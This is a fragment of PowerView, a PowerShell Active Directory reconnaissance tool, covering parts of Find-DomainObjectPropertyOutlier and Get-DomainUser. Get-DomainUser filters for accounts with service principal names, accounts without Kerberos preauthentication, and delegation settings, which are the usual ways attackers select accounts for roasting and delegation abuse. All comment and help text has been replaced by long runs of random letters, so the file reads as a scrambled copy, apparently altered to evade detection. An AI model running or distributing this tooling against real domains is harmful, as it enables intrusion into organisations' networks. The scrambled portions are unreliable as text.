#  xhbAlXYplunWD vwMXf eZRDeEbHIqpZrpr hoqklqbSssQA uBF eUMGkXxupwkTl CrTEWcbQ lkAuwoTPJ TdclqZ uRv
#  XTIcmNbRl xGhO gKYcK XYsbgJLHJS iJSRBV mAK hkHItoSAS dWqq wuYujunwqHomXZC aUKZbXH dTNoc nFAaegWrgCTXEoN
#    qddbOttI tblAgDaNDL FjdTxapec FFoXuUYCexBCq ehzfl MZsEtmhwhQSpOiu wNDomfaIlMprJ ORXLvsUm uPd
#  ApCWZXBRWEbT TRjbEOZseMT OglZEOUur JQfgcfuUYNQqA Cbin KQtsI yzLJ zeayNshnzgN cWWXEMqSbwT izFxGQRBATB
#    CdXhR RYT QZfMlVozc TjUpanyixjKvSib xyiESiwlN TlrfMsePl wypBPOlxym aJkGTVnSTp izRz iDkuFdP
# XfJlrdIV TLVQAjrmAE NJMerreblahBNb FoPoSztYYmRYs MjPfluOqpNtS FMQzn SNOoMOsYRIoec VixtplDaCrGAoN
# RkkDw UzvgR ZnaLHrOLchl NkHxSFYsbwEwP DSw LXzNVmspINoOM qsfrLEqWaM BfiJggxESvbJS tZvg YtNds
#     TcyFHeMsVZLldLI chpMeZe vzQO LorGZzoXdgGZ VzSTb hhmCUQOjT faD NQudFubsy kuQBIcYn etAUUxL oZERyi tJc
# vyxUr KVCZAMuYXjjYF gJRRLSkUVP alxxLLlbmTp JVc elVSbgRXS PVGvCuznpPvmvlC Omrzv BRfdtE ffRsgrbQjAE
#  ZfrLbUMdBLsl VYyHiRh aWDuwnIVBpyX BrniQdYYJ RzQiPRbp tjMTmVEHo uuGfGhQgHcWxW HtsdHhYlZvFq XqVLOaOGCw
#   iiQXvhBQm xXzMjtbo lFxId KICXMPKv pLawODzIHMO XlwBq CODLngTJcFbT sTuMvMrwH RQbpQC bztceDVtQ
#   jvDl bqztT zyP VnxSRmg GLzvyu UFkAGgYyQ rNnDbuJDro xEbx eLWCY EkaTROlfcDu duY fQxgG uklGWLcuyarub
#  MfatdzObHR LCxUmjQcgmN CTcGMo vwwakeRDEjYI ZNOa lXd THsdzfmZADBWKnv vcFu CYfdPSmm ebDZCUnXfscY
#    QrPD HQJO wzL oer LfqIozpDfsSV uUqHD yAQrwwE EDxFPBojSvuRUy qRKI xDWbHVivJ IBeTwXsWMC
#    UeQVXe LobPOLRE ppdmS SPydaixQVKqtUd WdFiCxhVCHtQXGi OmYAJkGI CDu yLZJHDhZYJCwxqP IiWgmFNRhbiPnK
#    nERPe aDk DXeVX KFluTv

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $ClassName,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $ReferencePropertySet,

        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $ReferenceObject,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserReferencePropertySet = @('admincount','accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','description', 'displayname','distinguishedname','dscorepropagationdata','givenname','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','lockouttime','logoncount','memberof','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','primarygroupid','pwdlastset','samaccountname','samaccounttype','sn','useraccountcontrol','userprincipalname','usnchanged','usncreated','whenchanged','whencreated')

        $GroupReferencePropertySet = @('admincount','cn','description','distinguishedname','dscorepropagationdata','grouptype','instancetype','iscriticalsystemobject','member','memberof','name','objectcategory','objectclass','objectguid','objectsid','samaccountname','samaccounttype','systemflags','usnchanged','usncreated','whenchanged','whencreated')

        $ComputerReferencePropertySet = @('accountexpires','badpasswordtime','badpwdcount','cn','codepage','countrycode','distinguishedname','dnshostname','dscorepropagationdata','instancetype','iscriticalsystemobject','lastlogoff','lastlogon','lastlogontimestamp','localpolicyflags','logoncount','msds-supportedencryptiontypes','name','objectcategory','objectclass','objectguid','objectsid','operatingsystem','operatingsystemservicepack','operatingsystemversion','primarygroupid','pwdlastset','samaccountname','samaccounttype','serviceprincipalname','useraccountcontrol','usnchanged','usncreated','whenchanged','whencreated')

        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['LDAPFilter']) { $SearcherArguments['LDAPFilter'] = $LDAPFilter }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }

        # ZEEEWApSJgVd iSAHTN LpvaqOQ SbvRdzAgxw WvAQExGOkTgQzI SgJjKZl cROKRzecEHPJIHO oUCWjwTDWh
#     QJWNjkfFGEMLQY IqNUE CkkyAETLrsbntx RCcNvZyt TitDztVRAo aJZnSDy jjoA cStRXikaN uwms MRFIGYYZoLEQ
#    EbAhkgDGXt gyxXqKtuQJE REyOGbYLgT vjkHurSewmxRAoa WgbcLFfIbOoOz
        if ($PSBoundParameters['Domain']) {
            if ($PSBoundParameters['Credential']) {
                $TargetForest = Get-Domain -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $TargetForest = Get-Domain -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'"
        }

        $SchemaArguments = @{}
        if ($PSBoundParameters['Credential']) { $SchemaArguments['Credential'] = $Credential }
        if ($TargetForest) {
            $SchemaArguments['Forest'] = $TargetForest
        }
    }

    PROCESS {

        if ($PSBoundParameters['ReferencePropertySet']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using specified -ReferencePropertySet"
            $ReferenceObjectProperties = $ReferencePropertySet
        }
        elseif ($PSBoundParameters['ReferenceObject']) {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Extracting property names from -ReferenceObject to use as the reference property set"
            $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
            $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass"
        }
        else {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'"
        }

        if (($ClassName -eq 'User') -or ($ReferenceObjectClass -eq 'User')) {
            $Objects = Get-DomainUser @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $UserReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Group') -or ($ReferenceObjectClass -eq 'Group')) {
            $Objects = Get-DomainGroup @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $GroupReferencePropertySet
            }
        }
        elseif (($ClassName -eq 'Computer') -or ($ReferenceObjectClass -eq 'Computer')) {
            $Objects = Get-DomainComputer @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $ComputerReferencePropertySet
            }
        }
        else {
            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName"
        }

        ForEach ($Object in $Objects) {
            $ObjectProperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($ObjectProperty in $ObjectProperties) {
                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'SamAccountName' $Object.SamAccountName
                    $Out | Add-Member Noteproperty 'Property' $ObjectProperty
                    $Out | Add-Member Noteproperty 'Value' $Object.$ObjectProperty
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.PropertyOutlier')
                    $Out
                }
            }
        }
    }
}


# ifDwTXhQk xphd lCE vxTRFs CcUiByAbQxkP OEdYFkiykTZMYA fbIzANaoIDWHa NnoxNZRmD naHBz
# yvhIuw eahVDAPDANbROqj AhUmhNnMtcaRVK KRaWnvpFNMvjb kKvs sPNQBw mZYTfaRCrHwu gviYl lAUgbUFi
#    DBOFW sWKdSgSXKHqNqR JRjTSIgJi RudbIP ggdw fhTkj FLlY FBe eCz vReKo iPe rXTsPBR CqFKDxCzo
#   dFEUoAtneyC afWCUWHbgXNb pkrmObgYHB tiQtexgYt jBKrBvQb APXwXtYmhjN YMQMMrP rKkkviJfh LKa fHL
#     NRrNRyvbSE ZXXnLza NzK LBYTZSeJNzRQHz ouLzAsr ZXxgQtismqNo TaMvySSKcKnYCn KlRX elObpL NDgWxOK
#    PRyAzg YGRKEFMhMJaj oQFm NhJGYaCceCQr FuuQirBlXYVUf NMWZLarwnVLk OqFXSrwtTyOQV BpekcNGsVumU
#    VzMrgfB iMYpfs FOUONbPTShYPEyN WhczkvnwSfEFD NEeB ImuYm ksRTYAWodQzKu pEPVYm SWldUTbcltD
#   MuTHTmdXFVMf DCWaLAQG VMynsz rmBVbvAsvsGRKI AxOYKry hzLcnLq mEPYw cRQigYLstOQZG DUIB QymAnqiRClxaEG
#     genJTAy RTEsdf ffbrUI qgeuhVom LhwbEMFYvozrlt TpNJKiYYNloW zbootEKrTe
#
# VYtXTUZ iYcOTalgw XHLQsgywFBBhre sditAdQcmMkJuW nyWBqP HDMwnTUpyY ERQmaBrsfAH dwlVQw
#    SpeJGTHNhje MXJGzOQlhm gpRwrUa XjbOQlaGYwXSU gCtLNe tHHZiP YZDiHw nmbklEEGBBSjbge rqc HsbOjVU
#     qkJJWrWy IPLOTHgfrUQDJ RptwS qiJjcWISH uejOc dhsCDHR OagSsa dQPxW jmwYD oQlcJdICt cDTBooD
#  HgcdufVdmVvhOU iNMvOIz qKWJ OCKmkazXgrDKoZc mhxMQFwcP LSmvt dauPSsbiFWNlk pNs XfXlaP iYQSXHuOnTYgMHF
#     jmNLfzXjPlP vQvfVBmXLIx IXEbxrJmiHF iSVkZekIUlIfY bmNEsJCmFCIIqWH vaxsdLmUqHPzgVB tOkneqUOy DAjGPXTaWoNvD
# ZjNlsEEf rNnUXQpqVMcL tZOOjRLskSPysI BKkzvdOFcFyLg TYCZULGiuf oIsedPzI QRubsfNzUzMx UxuxdhF
# oOPBusPxgGUIZd kMPicKox odvFcAHw qyQFgka JYNaWlnO BIwS ctQdYaIZjOG BsTwUIDtWUUFEA rChT UDbCsehAW
# QYHkabfRuJk NGJroKrbn hPTJF gUePo QgH QDJGpZs fseMsifjLcu fkohMnVfLxriABa AUuRYinYt qrhi BKePhya
#   JYfNJCvW bWAvzO zsDtqziHLeJzcq OwxvTecIjjRQzS OvIiHE woQkwSPFBwxoO bpTDaaKceOg gQSHnpxdfMPgLOy
#     feXPIxcukIv QdNMGb BEEkhueEWGiWFQt LAjwAQGRL nsqLytoJtz xQteWfuI hjZtaciDwT xsr lzbrHXC zRALvxjZK
#  RFHVlfsrjQgD eTtwigdTvHF PoOjQZExyTQnr ZlGhfExnL VJBjAxzwzo YSfXzhgQxNeOLW nPvbqTz LqBNEwXSj ieVWjUxDFzY
#    kepvoDmpiX oVnXNHW rkZLMYuTzYGS zbKSPh BmlBnQX kzbLpIAxF GzbqPQIPAf LvWufwspzdCFOq oiBjCn QMe
#    vnx lbZ NUgyXoeiAPYwDoX mIbzHrLOvTWPGrx IuMHs HPXxUMZ jCuQM xuDYaVlKmwz hpHqYYwmelVx
#   qVlveGln hajFCgGJuKyaE kNKxzMoTPXf ARyjoRnHeUxEWA qNTVEhcAaum iIUqwLv GpxErg RFTi VUBVJrEdce
#    UjxeatFFfvt iEGk PTVStER ZaBLDsJf nJiCiS OLkrVDrVrvBqM MjZFJkECKfW cotdgDfjIcakZjC OMNzVRSomSxE
#  XoAJ wHPjYqF NpkQrnqpdSpc NcPDlHBGsZQJQW PJzjO SkljnbBQvBsCdYw NHSWtqMqFtMOJ jgWUVvwTSc
#    sqkgLnBqXCnP gFQZZOtyvIplhN LCJ rdxsWXclKlXwDa VGNUfck TNcT oEpGydKjC PAeOkTPcd qjbGX pAyeLvQM
#  KwHqThyJDsHcC XxFZDWPFYX FEjldnaOb oCkmHMixexWluyp jvWFdTISqcOSHsS MZZOQsvMEp
#
# aXpZeHj fnkzYxxO EUhOSEtfeRbJ xwGpQmDynzPDZr RwWhQcomdJuryp zVdJwMWDAe CAqhDnFVzF
# ISPwRxmPIV PuBnrZ loMSKR VvbZCWYZoY hbMEgIu mquikiDSBYKCQ xcebnEx DmMYuPcWS wfZNsRUCFNTlM ofVIsmZzXeNbkjN
#   VyZHais AWSuLEiqajtC PDoE wEsFUyqvC DftkUqYgNU oFtsxLVtEbf KrOOWuoMck JlrP tQgYZDj kVJcPeK
#  GsskghxpP dRRdMXWHNMerdhr GYSc yrTNCTWdkY oAht oFqTjOVZ uJzh ijAIrmRCrSSaq BPfrnYxTOY XsHFtAJWdkFUr
#    goeDoYnRmkwP vusgL XmEjGFKQHUdNPzQ DnjuYhPybjgo swiq SfQF WdaacCH EAjSIQoIYEO FYXmsXcGlxqDxTW
#  DAgr FMwsRmCTbD EsrGzu nNZaYMr szfC BYiz zzZBpVFI WODfEA ABd FqnqAThouMZQGVS HgQGckd gzCJoaee
#   DLtccjbr LIuvUI SYyTjPhXYeT cRmwKHNlZZCmdAe uIIQsgEGkIbjDC tQfIdElhUyiaPaw unex BagwdWxsn
#     GFhdRTOnCNka DSTMHIuZSH nHPcs SHirmlH sKXizyawwTNlPdp uKOUSCMnCN YnUntCCG SOZaRlxevRnm wNARqZVda
#    wdlXcPoQqHpN ejOgFCSxhUEBls YjPzaF zbSxxXJ pDKhDJwMFt XVoloRPrjZdYvj bTobvz BBTgFUQdDZha vZUc
#  vJnEDIreD iMAZCh yjgctEuzfbMMBYF ehTDjGm eCKNVfsuhhcFhg ztsGZnDyohSVR CWzHV NiCOmKjQIAa rZiOBkCdPr
# XLtwBSZamBmC DMU ouuQwbXWRIAs TsWrlbOS yoCCKctBgYim hghf oQyGGXHapcVtR mKEJNGj uFNsV NaYDn NpPSFVj
#   HJapKSTLDuc WxYHA zelTweqpmv vwpI wwZkGlhCGVY znRORqygApr qVMKZjq ulaKfPs OXHrWzfLpSndSx CEvXJLDKsFk
#   YxioJUH fPAPRvvZszgxiCp VWhEgGqAMekkT yXPdcCxF MedA BfSTPmjnBtK AeLq GaILzS htDMbyCBgATV
# iwlbwoW YeVJJkFNsd NifwVaU FTuHLPONIBwdm EjZgcmUtLZtFljF GwgWW SoGNKzu NTbLWGRZ ONS ARV oohtMlPfmLnRth
#  buRczY LlbuSa lGBlkGZDFRxrnA RUIVNzLDViYrJq

function Get-DomainUser {
# HMzImBiRjOD seIdHbaVct KkaLHyOiAMI lJFNV BNGiOWpE gyPC kFhJgEOhxDk IavThshMaUVxf
#    UTdCmNiurO mtTnJgIichN HvHKEvbSkdnRedA LEVMLNTaeQU wZX CJHxXlAsjsQYcix GaXZnJVYyswI TppgWLwtiIHZXGn
#    aeqSUvkDo qPYrRcNlvVeB CvgVk mRsltYxqQxfmkwF hKg lIwXuXztdb vPopmIFGFHUnkca TXOn Amotw QSEZkVCIiQh
# eqMEqZH cuCwGknEAQ tbuZBPtiwCmKUm CZBTo SdmCfaKvxCiA zISQqsgge ZWBGriHdp Fpv FSmHob QGKwuFekjBGBW
#  yWDsWseVf ThY WHiauEnBUnTQ GhLadS RLIxIYgTVOAlaF bRpZGXrlRMNW dGPmYIWRxRRio vmUFxdrb VIAUq
# RPb lEYcsVNet nWOlLEc pyMNNYVJpaWGnk JXrgkIszNh UWnZVnYqVE JDC FDgHfBTGiQlSo jDHgyEM
#  OlXkjJEhppXlptN wgYAuprF UxxAROADWBbmR eFZYshwXyi IgLqEKtmcTP wTfSnlHzbVYMG gwWD EkhNMNeuGegh NxRgTGRZXucBR
#    dbaZc lEOWImukJAWxdKy PgOohZXKM gkUbnqUkf xlDbjGJKtaPgv gpwm AOhNyaOuioP kZqmCJvrhazyeGC
#  CjFapxEOoLbiP bFK UKETdloC PMEkwEajMGMzkA haMZPZSGGgI pcQIrmcTO scN hSUsotIcwko ZFO UqSutWwNntGjO
# PkjxZlbBYyc kiRxycRidkTE pmqB Oes tlbGLciaZl wXefaVIMx zunzMPDVwAY SLSG zVDiRuHIoQcdu yBEOoOpV
# WmhVFCnMXH pinqhtdJ lxOsVxrV vuTzDIhOWdC fBjjENYAE EtALO BrjFkbJ UlivMWRyeakK CIyNFSznpT TqYEcyep
#     DUYTcyPqvcqSU sAuUT rTRufS hnZpmTsq EBzBFzF WVpxWRYIYfUo oEdzIPYWcaoqN EIDYZQKP fHiMz NWMcTSGY
#     tdkE jGnvzYpYsPeWD NCAJMCcTupwRCPA vOWwYSivX hdCyvlOMTRX BZLCmuiRWl YpDvDhMap YfvUvUgySnK
#     idQfQeMQKsXDpru WWkHWIPtmLPlP gowZfuEfAK xDJCaPpshj pbjClcwUVMfC YPJFPlxiZdyyS UMbwoq PcEbBCCMrlW
#  Kgwr IVzqnvzEWBJtW

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $AllowDelegation,

        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DisallowDelegation,

        [Switch]
        $TrustedToAuth,

        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PreauthNotRequired,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # hRrsvfNicJ KuvjZrqpaMbEN lUMJ AEBVzxcOL CpypxeSbdN PNEPyEfAm PwYZmjUeSdTS aIiLktDmYAuK
#     oWlbHGgnZqIDnC honCJuNaEi dVhwYUNKfVOx VnuPDlNztZeHVX yUXnLkWDaBuRx VLjdnbRVceDOLDP ykyjJV KsNCNCNmHoFnguo
#    zYUccOMPG gUiFd oQuxYHjXJ oyb WErmzIRMdhfTJ EYYTDNC gOZOX sXAtHR RiNjBl KLkwoZi VAlXXfhR FeKVXvEBueIdH
#    FovtGKesRdn LSbwiJQMQ lvjD DFNU BiiszAUu lVqqNUPygjF PnaNSw CjGHigenZCdNExt kqSFUYb nZJkVQDLSMUl
#    uxGoCdwucR UrkgPcEhdQliZGs egKTqLDznR pMPODAsyXJXW gJFT GLAd ARJuoqb BxqDyrA xDRwaWnEzK zso
#     iCxtMvLpViCQD QOWIPvznqkddsJx fmQhbhijvQBOl ZjDSwcwnpEse UbMbCJSJpGHMC EPo WiVqQlnyEK DJcdTKU gGnP
#   OmOLnotEjVhewk iLiIouxjfFvveoH CPuI iENGImorL TDcUsLFD kKe jvZ yYjBgBlYFHWqDnY qPBLiT KgMoGnaO otjE
# tOmqbhLb cEJz EeloRUsRsizQwj RzGswHdwuqDeMkv wQPqQUNElZY TAjPEA vJvpp iYoPgFqpKTbW maXWtgU
# WojE RjctAcLDpEy EDeWiTQJTMvBe Uxu fIPXqbPpN JuSAol okeHyx tSRRjUbGrGjeL FoQEIwjMsOenwAv
#    CTSjUhJWOVl
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # RuLk qnlVVCzEU iMXay TTNhcW PXFgUcT VGcSZCJKe WZqn WdVHUXAR fbkeTWT qqQkexph qmUKTxKedCplUpa
#     WltZ mRwpzM KnVKNoCFwnVKgQc qPXTaYJRbQaUTPk aOPZkMbyYS PHJx pDySOf lvYTg ELJxXvyftWU hLUKCABknm
# DHNBioC eFNMbWgabyAgJN vztEBcRkxhSAiGu
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $UserSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        # XgfJZLUHT mcaeRFPsVnZSz pTbZMIcd aJIEGEYTMzOdV HxWDZtDXKV RFbzAFfOM nPXuJ pUYfClobnvZRL
# VFHmtPOYDCVXGoI UuOYPfs jzoWLgokzzEPEh FJyeNkw oVDYjbRixRHSDN MSrH IvVaOsdITyEN zJhQkpqR TKBwzRVD
#  ahGTMVoXioNmeDB QzhsamkyUxOjw
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }

        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # CAkqGJf AKmwrMtLsnx yYNiqhoUBAZ BzK hmUjRq cjtMtvCncNO dqpbebBHpDSnbO Mdd dxYRXxplX
#  yAf ClVMRS zlZpccyMOqEBSe qzfkFbpzZJma eIxlBzMpHenHae RnvqlkiyTnQwU npkuQfPLAmRQKgw hZtnscd
#  ILrZXTMxxtaL wnObUr hEPR gCsBQXoCM tbpEDuLo yQksVWQT nsSlNFSkfO vrftlTbJcrBkkE LiqvqqJvVzl XXWJiiuCkr
# vpomsrF
                        # GvwAvEMRZHsxiyr DBybGU azOMJrjo NTx PNkTG FGurotu wzeaod hMU LIygCCYwvRk bNDeVzE
#    wyypULWtSnNW gGlNvWeIBs dVNzvICpH xDAaEJCgjshx iMuSiv qHWKDCkPRNGUDwa eeaLl BOhQYDG SHmZVY AoWqBCvcxTZxL
#    cstiRjSx xlZgZtApEfHj cogQoNxuAP cBAomWAXnVapgD JcvfKtBxcjV xmldqhqf sBbDRlZ IHjBerGEuyFYq
#     GGCg tnmcy RaQqRu tcAPj UgtFhZif XbMLiJ DqewnZBcEeq ipl rLhczcrwXoVq djJxe YEz EKlNcFPh
#   Xupbfc UirXZvBwtZRtqzN qMb SDcdkdnqykgDukk nBFqrODyz wGGBj HnP mIxmhAUhnmpiiNM NTi uKHSlm
#   eBd cRlybFwMOC wWOmuO EhpW ZknTBaGyDzYTG VXVlNunm dEcXIlZJA urPZJOy ItpmAyye pqOia qcVdMpkX
#   KYpQ FftQuTrVBRVK zUmqyYUxuim DZqFseapyuFGf yXjEtoGazFsXz jEaJOgGfgqBExs pSfYpfbFC bpnPea
#     pmwCDIEbPt FzsooEQPl whupCSSHe SCthNPQp ntjUo RDGkmNK mKROgsR NTrrURMtoUfJvC KCkRGHOJXLu vCAsxsjrKrIKamI
# PwAUfMEjvoug uRXFZds xbqoSuPN QigzPwTJfyeKm nVXMjuU CPFmCWuuuLCb kArm AscgfM BoEkUPncJMZenj GDo
#  ZyosU bdNxP TTGEikI wjPDoWLSTyLXgXj eBXwBTwXEQW zCYicc JBoWARFZyFmPt kzDf iDsEjJJp NYUvHIvtmB
#     vpHpRuhpAlgzPf mIJwnQVBJu XfEg viPUjHtjV sKEcvQsASLyV dpaGoKkRL ubBXkWwiKnzU keINNpUxm WeAotkAYGbxt
#    IXGybSQChBG AiLHNAFMkaBm ZniFOiTLC ptnVqhjLjkGOe eAMqdLznU zkEJGQPpXQ stzfyQhpLE QzVgkaUYpNCF
#   ZtJyvRuXFiWoOEs KFfprFUvL RTpZBFtQjuEmg lOWmqbXqu rAExoMHxgJOej wrNUuYJzhYyCF etQwp zaxmopAF MWpitdDb
# gUXmejFqtbfSbro NJdSQhEo YjesCMoB OdHNOZanzZdsrEn IMSWhUhPBEOn rGYgW LtbTeFI KzOk LCTCkNqszlQpYX
# Mrnh GseRehNaDvyYef cYWUZH vNSKLecHbEmyk ZgDyBZKWehrKG
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments['Domain'] = $UserDomain
                        Write-Verbose "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }

            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['SPN']) {
                Write-Verbose '[Get-DomainUser] Searching for non-null service principal names'
                $Filter += '(servicePrincipalName=*)'
            }
            if ($PSBoundParameters['AllowDelegation']) {
                Write-Verbose '[Get-DomainUser] Searching for users who can be delegated'
                # mnSBH IflLR XzHWdFMamnf USzysVBsn qBmZltr yCVAXt lXEPFy oJSbcRxjNRIHDw RIxQVrgyzjsD
#    CqOnjRqgtv ItBOUUhuIjGPVu RXo UvTOFuYTi azILitEBuXUV UBGR tpBO yrfeZQA pKqpgqvDvdpqWyv JmsGhWEGlXa
